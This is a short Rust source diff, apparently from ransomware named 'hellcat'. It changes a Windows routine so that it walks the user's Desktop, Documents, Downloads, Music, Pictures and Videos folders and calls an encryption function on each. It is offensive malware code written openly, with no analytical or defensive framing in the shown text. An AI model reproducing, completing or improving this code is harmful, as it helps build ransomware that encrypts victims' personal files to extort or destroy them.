@@ -21,6 +21,22 @@ pub async fn hellcat_windows() {
         }
     }
 
-    // start encryption
-    enc::encryption(home_str, decrypt);
+    // array of home dir with: Desktop, Documents, Downloads, Music, Puctures, Videos
+    let intresting_folder = [
+        "Desktop",
+        "Documents",
+        "Downloads",
+        "Music",
+        "Puctures",
+        "Videos"
+    ];
+
+    for f in intresting_folder {
+        // start encryption
+        let full_path = home_str.to_string() + "\\" + f;
+        enc::encryption(full_path.as_str(), decrypt);
+    }
+        
+
+
 }
